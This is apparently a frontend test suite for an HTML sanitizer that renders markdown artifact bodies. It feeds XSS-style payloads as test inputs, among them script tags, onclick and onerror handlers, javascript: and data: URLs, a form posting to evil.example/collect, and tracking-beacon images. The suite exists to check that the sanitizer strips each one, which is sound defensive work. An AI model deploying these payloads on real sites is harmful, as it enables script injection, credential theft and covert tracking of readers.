// The sanitizer case set. One case per admitting clause of the sanitization
// rule: no executable node survives, no event-handler attribute survives, the
// allowlist admits no URL scheme other than http, https, and mailto, the
// sanitizer takes the rendered output as its input, and frontmatter never
// reaches this path.
//
// Every payload except the last is delivered as an artifact body and renders
// through the sanitized rendering path. What the sanitizer leaves in place of
// a removed node, attribute, or URL is this implementation's choice, so each
// case asserts the absence its clause states rather than a replacement.

import { render } from '@testing-library/react';
import { describe, expect, it } from 'vitest';

import { ArtifactBody } from './components/ArtifactBody';
import { PropertyTable } from './components/PropertyTable';

function renderBody(body: string): HTMLElement {
  return render(<ArtifactBody body={body} />).container;
}

/** attributeValues returns every attribute value on every element rendered,
 * so a case can assert that a scheme survives on no attribute rather than on
 * one it names. */
function attributeValues(container: HTMLElement): string[] {
  const values: string[] = [];
  for (const element of container.querySelectorAll('*')) {
    for (const attribute of element.attributes) {
      values.push(attribute.value);
    }
  }
  return values;
}

describe('the sanitized artifact-body rendering path', () => {
  it('renders a well-formed body as a document', () => {
    const container = renderBody('# Title\n\nA [link](https://example.com/a) and `code`.\n');
    expect(container.querySelector('h1')?.textContent).toBe('Title');
    expect(container.querySelector('a')?.getAttribute('href')).toBe('https://example.com/a');
    expect(container.querySelector('code')?.textContent).toBe('code');
  });

  it('keeps no executable node', () => {
    const container = renderBody('Before\n\n<script>window.hijacked = true;</script>\n\nAfter\n');
    expect(container.querySelector('script')).toBeNull();
    expect(container.textContent).toContain('Before');
  });

  it('keeps no event-handler attribute', () => {
    const container = renderBody('<p onclick="window.hijacked = true;">Text</p>\n');
    expect(container.querySelector('[onclick]')).toBeNull();
    expect(container.textContent).toContain('Text');
  });

  it('keeps no javascript: URL', () => {
    const container = renderBody('<a href="javascript:window.hijacked=1">Go</a>\n');
    expect(attributeValues(container).some((value) => value.toLowerCase().includes('javascript:'))).toBe(false);
  });

  // The rule ranges over every attribute the sanitizer keeps rather than
  // over links alone, so the payload is delivered on a link, on a markdown
  // image, and on a media element. A sanitizer configured with a URI
  // allowlist and nothing else keeps the last two, because a data: URL on a
  // media element's source attribute is admitted by a branch that does not
  // consult the allowlist.
  it('keeps no data: URL on a link, on an image, or on a media element', () => {
    const bodies = [
      '<a href="data:text/html,<b>x</b>">Go</a>\n',
      '![x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)\n',
      '<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=" alt="x">\n',
      '<video src="data:text/html,x"></video>\n',
      // A candidate list carries several URLs, and the offending one need not
      // lead. A test that reads the whole value passes on the leading
      // relative candidate and keeps every later candidate verbatim.
      '<img src="/ok.png" srcset="/ok.png 1x, data:text/html;base64,PHN2Zz48L3N2Zz4= 2x" alt="x">\n',
    ];
    for (const body of bodies) {
      const container = renderBody(body);
      expect(attributeValues(container).some((value) => value.toLowerCase().includes('data:'))).toBe(false);
    }
  });

  // The rule ranges over every scheme rather than over the ones an exploit
  // is usually written in, and RFC 3986 lets a scheme carry a digit after
  // its first character. An allowlist that recognizes a relative URL by
  // spelling out the characters a scheme cannot hold admits a digit-bearing
  // scheme as if it carried none, so the case drives one that is registered,
  // one that is not, and one whose payload is a link.
  it('keeps no URL whose scheme carries a digit', () => {
    const schemes = ['s3://bucket/key', 'h323:alice@acme.com', 'a1:window.hijacked=1'];
    for (const url of schemes) {
      const container = renderBody(`<a href="${url}">Go</a>\n\n[Go](${url})\n`);
      expect(attributeValues(container).some((value) => value.includes(url.split(':')[0] + ':'))).toBe(false);
    }
  });

  // A relative URL carries no scheme, and the allowlist admits it. The
  // forms a manifest's own links take are a path, a bare filename, a query,
  // and a fragment, and a value whose leading run cannot open a scheme.
  it('keeps a relative URL', () => {
    const relative = ['/docs/a.md', 'sibling.md', './nested/b.md', '?version=2', '#section', '1abc:not-a-scheme'];
    for (const url of relative) {
      const container = renderBody(`[Go](${url})\n`);
      expect(container.querySelector('a')?.getAttribute('href')).toBe(url);
    }
  });

  // The sanitizer takes the rendered output as its input. The payload here
  // spells no HTML: it is markdown link syntax, which the renderer emits as
  // an anchor carrying the author's URL. A sanitizer wired to the markdown
  // source finds nothing to remove in it and passes every other case in this
  // file, so this is the case that discriminates the two wirings.
  it('sanitizes what the renderer emitted rather than the markdown source', () => {
    const container = renderBody('[Go](javascript:window.hijacked=1)\n');
    expect(attributeValues(container).some((value) => value.toLowerCase().includes('javascript:'))).toBe(false);
  });

  // A form on the registry's origin is indistinguishable from the UI's own
  // chrome, and the origin is the one the session cookie is scoped to, so an
  // author who can write a layer's source could otherwise prompt a reader for
  // a credential and post it to a host of the author's choosing. No markdown
  // renderer emits a form control, so the whole set is dropped.
  it('keeps no form control', () => {
    const container = renderBody(
      'Before\n\n<form action="https://evil.example/collect"><input name="q"><button>go</button></form>\n\nAfter\n',
    );
    for (const tag of ['form', 'input', 'button', 'textarea', 'select', 'option']) {
      expect(container.querySelector(tag)).toBeNull();
    }
    expect(container.textContent).toContain('Before');
  });

  // A URL the browser fetches without the reader acting reaches the host it
  // names with the reader's IP address, User-Agent, and Referer, so a body
  // that named a foreign host on one would make every view of the artifact a
  // report to its author. The payload is delivered on a markdown image, on a
  // src attribute, on a candidate list, and in the scheme-relative form that
  // names a host without spelling a scheme.
  it('keeps no fetching attribute that names a foreign host', () => {
    const bodies = [
      '![b](https://tracker.example.com/beacon.gif?viewer=1)\n',
      '<img src="https://tracker.example.com/beacon.gif?viewer=1" alt="b">\n',
      '<img srcset="https://tracker.example.com/a.png 1x" alt="s">\n',
      '<img src="/ok.png" srcset="/ok.png 1x, https://tracker.example.com/a.png 2x" alt="s">\n',
      '<img src="//tracker.example.com/beacon.gif" alt="b">\n',
      '<video poster="https://tracker.example.com/poster.png"></video>\n',
    ];
    for (const body of bodies) {
      const container = renderBody(body);
      expect(attributeValues(container).some((value) => value.includes('tracker.example.com'))).toBe(false);
    }
  });

  // A link is followed by the reader rather than by the browser, so it keeps
  // its host, and an image that resolves against this origin keeps its URL.
  it('keeps a link to a foreign host and an image on this origin', () => {
    const container = renderBody('[Go](https://example.com/a)\n\n![x](/assets/x.png)\n');
    expect(container.querySelector('a')?.getAttribute('href')).toBe('https://example.com/a');
    expect(container.querySelector('img')?.getAttribute('src')).toBe('/assets/x.png');
  });

  it('renders a markup-carrying frontmatter value as literal text', () => {
    const container = render(<PropertyTable raw={'title: <img src=x onerror="window.hijacked=1">\n'} />).container;
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('[onerror]')).toBeNull();
    expect(container.textContent).toContain('<img src=x onerror="window.hijacked=1">');
  });
});
